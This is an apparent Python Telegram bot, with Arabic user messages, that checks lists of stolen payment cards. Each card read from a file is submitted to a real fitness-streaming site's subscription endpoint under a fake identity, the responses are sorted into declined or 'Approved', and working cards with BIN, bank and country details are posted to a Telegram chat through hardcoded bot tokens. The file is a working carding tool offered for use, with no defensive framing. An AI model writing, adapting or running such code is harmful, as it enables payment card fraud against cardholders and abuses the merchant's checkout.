import requests
import time
import random
import telebot

tok='7127504768:AAGSIR0evw_pvxOVBgxLWflu7FcL-G8eFb4'
tok2='7095512780:AAHT-nxlah0c_xA903aZ3m7WHuPl6QIRTU0'
id = '5643656889'


starton="""
مرحبا بك ✨
APPROVED PRO ♻️

البوابات المتوفرة حاليا 🎯 
Braintree auth 

امر   /chk

في المستقبل سوف يتم توفير بوابات اكثر 🎯 

في حالة وجود مشكلة في البوت او اضافة بوابة خاصة بك تواصل 

@EbrahimEldsoky
"""

chk="""
رائع ✨
الان قم بارسال الكومبو الخاص بك الان ✅
"""

bot=telebot.TeleBot(tok,parse_mode="HTML")

@bot.message_handler(commands=["start"])
def start(message):
	bot.reply_to(message,starton)
	
	
@bot.message_handler(commands=["chk"])
def chkbot(message):
	bot.reply_to(message,chk)
	
	
	print('start')
	
	
@bot.message_handler(content_types=["document"])
def main(message):
	ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)

	
	print('تم')
	
	
	H =  '\033[1;31m' #احمر
	K = '\033[2;32m' #اخضر
	Z = '\033[2;36m'#ازرق
	C = '\033[1;33m' #اصفر
	B = '\033[2;35m'#بنفسجس
	
	
	nm=0
	
	file2 =open('cc.txt','+r')
	for ccx in file2.readlines():
		ccx=ccx.strip()
		nm += 1
		n = ccx.split('|')[0]
		mm =ccx.split('|')[1]
		yy =ccx.split('|')[2][-2:]
		cvc =ccx.split('|')[3].replace('\n', '')
		P=ccx.replace('\n', '')
		
		print(' تم التشغيل')
		
		
		emil = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=17)) + '@gmail.com'
		
		
		try:
			data = requests.get('https://bins.antipublic.cc/bins/'+ccx[:6]).json()
		except:
			pass
			
		try:
			bank=(data['bank'])
		except:
			bank=('UNKNOWN')
		try:
			emj=(data['country_flag'])
		except:
			emj=('UNKNOWN')
		try:
			cn=(data['country_name'])
		except:
			cn=('UNKNOWN')
		try:
			dicr=(data['level'])
		except:
			dicr=('UNKNOWN')
		try:
			typ=(data['type'])
		except:
			typ=('UNKNOWN')
		try:
			url=(data['brand'])			
		except:
			url=('UNKNOWN')
			
		ap=(f"""◆CARD➜{ccx}                           
		◆STATUS ➜ incomplete ✓           						       ◆SUCCESSFULL ➜ Approved. ✅                           
		◆GATEWAY ➜ Braintree Auth           
		━━━━━━━━━━━━━━━━━                    
		◆BIN ➜ {ccx[:6]} - {dicr} - {typ}                 
		◆COUNTRY ➜ {cn} - {emj}               
		◆BANK ➜ {bank}               
		◆Brand ➜ {url}                     
		━━━━━━━━━━━━━━━━━                         
		◆BY: @EbrahimEldsoky	""")
		
		
		ccn=(f"""◆CARD➜{ccx}                           
		◆STATUS ➜  CCN ✓     						       ◆SUCCESSFULL ➜ Approved. ✅                           
		◆GATEWAY ➜ Braintree Auth           
		━━━━━━━━━━━━━━━━━                    
		◆BIN ➜ {ccx[:6]} - {dicr} - {typ}                 
		◆COUNTRY ➜ {cn} - {emj}               
		◆BANK ➜ {bank}               
		◆Brand ➜ {url}                     
		━━━━━━━━━━━━━━━━━                         
		◆BY: @EbrahimEldsoky	""")
		
		ccn2=(f"""◆CARD➜{ccx}                           
		◆STATUS ➜  CCN 2✓     						       ◆SUCCESSFULL ➜ Approved. ✅                           
		◆GATEWAY ➜ Braintree Auth           
		━━━━━━━━━━━━━━━━━                    
		◆BIN ➜ {ccx[:6]} - {dicr} - {typ}                 
		◆COUNTRY ➜ {cn} - {emj}               
		◆BANK ➜ {bank}               
		◆Brand ➜ {url}                     
		━━━━━━━━━━━━━━━━━                         
		◆BY: @EbrahimEldsoky	""")
		
		true=(f"""◆ CARD  ➜ {ccx}                           
		◆ STATUS ➜𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 True ✅              ◆ SUCCESSFULL ➜ Payment method successfully added. ✅                           
		◆ GATEWAY ➜ Braintree Auth           
		━━━━━━━━━━━━━━━━━                    
		◆ BIN ➜ {ccx[:6]} - {dicr} - {typ}                 
		◆ COUNTRY ➜ {cn} - {emj}               
		◆ BANK ➜ {bank}               
		◆ Brand ➜ {url}                     
		━━━━━━━━━━━━━━━━━                         
		◆ BY:""")
		
		
		
		cookies = {
					    'li_sugr': 'e09ffcb7-b77e-4097-b7ac-d3b5a1db1c0a',
					    'bcookie': '"v=2&862e192b-3866-46d2-8415-c4ef3e14965a"',
					    'UserMatchHistory': 'AQIz509os4R3XgAAAY61feNQ-3k182NkaHruGw_BZUV3a4VWH359j_t1zJmUD44v_Z5k88SnmHfCYA',
					    'AnalyticsSyncHistory': 'AQKVRT1i1r6mgQAAAY61feNQzPq-kUat55-IfTjXmmNP2iMSsx_yH6kFrPPFvfr13e7GItTLSZUHzDG2n0bFjw',
					    'lidc': '"b=VGST02:s=V:r=V:a=V:p=V:g=3189:u=1:x=1:i=1712490102:t=1712576502:v=2:sig=AQHTZ8jMxg9HeLynLdy_M7crYIXdVgKM"',
					}
					
		headers = {
					    'authority': 'px.ads.linkedin.com',
					    'accept': '*',
					    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
					    'content-type': 'text/plain;charset=UTF-8',
					    'origin': 'https://www.lagreeod.com',
					    'referer': 'https://www.lagreeod.com/',
					    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
					    'sec-ch-ua-mobile': '?0',
					    'sec-ch-ua-platform': '"Linux"',
					    'sec-fetch-dest': 'empty',
					    'sec-fetch-mode': 'cors',
					    'sec-fetch-site': 'cross-site',
					    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
					}
					
		data = '{"pids":[5143044],"scriptVersion":141,"time":1712492707072,"domain":"lagreeod.com","url":"https://lagreeod.com/subscribe","pageTitle":"Subcribe to Lagree Fitness On Demand | Virtual Lagree Fitness Classes - Lagree On Demand","websiteSignalRequestId":"fad86452-5f24-45dc-fd45-c44c1a3172a1","isTranslated":false,"liFatId":"","liGiant":"","misc":{"psbState":0},"isLinkedInApp":false,"hem":null,"signalType":"CLICK","href":"","domAttributes":{"elementSemanticType":null,"elementValue":null,"elementType":"submit","tagName":"BUTTON","backgroundImageSrc":null,"imageSrc":null,"imageAlt":null,"innerText":"START YOUR SUBSCRIPTION","elementTitle":null,"cursor":"pointer","formAction":"register/validate_subscribe","isFormSubmission":true},"innerElements":null,"elementCrumbsTree":[{"tagName":"main","nthChild":3,"id":"site-root"},{"tagName":"section","nthChild":0,"classes":["pb-100","pt-0","px-2"]},{"tagName":"div","nthChild":0,"classes":["container1080"]},{"tagName":"form","nthChild":1,"id":"register_subscribe","classes":["flex","nowrap","row"],"attributes":{"action":"register/validate_subscribe","data-gtm-form-interact-id":"0"}},{"tagName":"div","nthChild":2,"classes":["col","mb-mob-3","order-mob-1","pl-4","pr-0","px-mob-1","w100"]},{"tagName":"div","nthChild":0,"classes":["big-padding","border","for--loading","panel"]},{"tagName":"div","nthChild":12,"classes":["row","w100"]},{"tagName":"div","nthChild":0,"classes":["aic","col-12","flex","jcc","px-0"]},{"tagName":"button","nthChild":0,"classes":["black-bg","btn","btn-tall","btn-wide","f-14","w100","white"]}],"isFilteredByClient":false}'
					
		response = requests.post('https://px.ads.linkedin.com/wa/', cookies=cookies, headers=headers, data=data)
					
		cookies = {
					    '_ga': 'GA1.1.777105074.1711957370',
					    '_gcl_au': '1.1.886741420.1711957370',
					    'optiMonkClientId': '42b3177f-139d-a2f9-d22b-99dc134be88f',
					    'ci_session': 'b1u7jnha8ng1i77ilitv17id0it9bdmf',
					    '_ga_4HXMJ7D3T6': 'GS1.1.1712490097.3.1.1712490438.0.0.0',
					    '_ga_KQ5ZJRZGQR': 'GS1.1.1712490101.3.1.1712490570.0.0.0',
					}
					
		headers = {
					    'authority': 'www.lagreeod.com',
					    'accept': 'application/json, text/javascript, */*; q=0.01',
					    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
					    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
					    'origin': 'https://www.lagreeod.com',
					    'referer': 'https://www.lagreeod.com/subscribe',
					    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
					    'sec-ch-ua-mobile': '?0',
					    'sec-ch-ua-platform': '"Linux"',
					    'sec-fetch-dest': 'empty',
					    'sec-fetch-mode': 'cors',
					    'sec-fetch-site': 'same-origin',
					    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
					    'x-requested-with': 'XMLHttpRequest',
					}
					
		data = {
					    'stripe_customer': '',
					    'subscription_type': 'Weekly Subscription',
					    'firstname': 'Rosella',
					    'lastname': 'Rosenbaum',
					    'email':'a'+emil,
					    'password': '20056677',
					    'card[name]': 'ebrah',
					    'card[number]': n,
					    'card[exp_month]': mm,
					    'card[exp_year]': yy,
					    'card[cvc]': cvc,
					    'coupon': '',
					    's1': '19',
					    'sum': '26',
					}
					
		response = requests.post('https://www.lagreeod.com/register/validate_subscribe', cookies=cookies, headers=headers, data=data)
					
		
		if ('Your card was declined.' in response.text):
			print('[',nm,']',H,ccx,'تم رفض بطاقتك.')
		
							
		elif 'Your card number is incorrect' in response.text:
			print('[',nm,']',H,ccx,'تم رفض بطاقتك')
			
			
		elif 'invalid_cvc' in response.text:
			print(H,ccx,'cvc خطاء')	
				
				
		elif 'Invalid account.' in response.text:
			print('[',nm,']',Z,ccx,'حساب غير صالح.')
				
								
		elif 'Your card number is incorrect.' in response.text:
			print('[',nm,']',Z,ccx,'رقم بطاقتك غير صحيح.')
					
													
		elif "Your card's expiration month is invalid." in response.text:
			print('[',nm,']',Z,ccx,'شهر انتهاء صلاحية بطاقتك غير صالح.')
				
				
		elif 'The Month field must contain a number greater than or equal to 1.' in response.text:
			print(Z,ccx,'The Month field must contain a number greater than or equal to 1.')
				
				
		elif 'The Month field must contain a number less than or equal to 12."' in response.text:
			print(Z,ccx,'The Month field must contain a number less than or equal to 12."')
				
				
		elif 'incorrect_cvc' in response.text:
			print(Z,ccx,'ccn 1')
			requests.post(f'https://api.telegram.org/bot{tok2}/sendMessage?chat_id={id}&text={ccn}')
						
			
		elif 'The CVC field must contain only numbers.' in response.text:
			print(Z,ccx,'ccn 2')
			requests.post(f'https://api.telegram.org/bot{tok2}/sendMessage?chat_id={id}&text={ccn2}')
				
				
		elif 'incomplete' in response.text:			
			print(K,ccx,'Approved 🤠 ')
			requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text={ap}')	
				
				
		elif "Payment success" in response.text:
			print('[',nm,']',K,ccx,'الدفع الناجح')
			with open('Visa True.txt', 'a') as x:
				x.write(ccx+'الدفع الناجح'+'\n=======\n')
							
		elif "Payment Completed." in response.text:
			print('[',nm,']',K,ccx,'تم التسديد.')
			with open('Visa True.txt', 'a') as x:
				x.write(ccx+'تم التسديد.'+'\n=======\n')
							
		elif "Thank you for your support." in response.text:
			print('[',nm,']',K,ccx,'شكرا لدعمكم.')
			with open('Visa True.txt', 'a') as x:
				x.write(ccx+'شكرا لدعمكم.'+'\n=======\n')
							
		elif "Success" in response.text:
			print('[',nm,']',K,ccx,'نجاح')
			with open('Visa True.txt', 'a') as x:
				x.write(ccx+'نجاح'+'\n=======\n')
							
		elif "Thank you" in response.text:
			print('[',nm,']',K,ccx,'شكرا لك')
			with open('Visa True.txt', 'a') as x:
				x.write(ccx+'شكرا لك'+'\n===========\n')
									
		elif "succedd" in response.text:
			print('[',nm,']',K,ccx,'ينجح')
			with open('Visa True.txt', 'a') as x:
				x.write(ccx+'ينجح'+'\n==========\n')	
					
					
		elif '"success":false' in response.text or '"success":true' in response.text:
			print('[',nm,']',C,ccx,'success":true&false')
			with open('Visa True.txt', 'a') as x:
				x.write('false&True:'+response.text+'\n')
			requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={id}&text={true}')
						
		else:
			print('[',nm,']',C,ccx,' response new')
			with open('Visa True.txt', 'a') as x:
				x.write(response.text+'ريسبونس جديد'+'\n')
		nm+=1
	
bot.polling()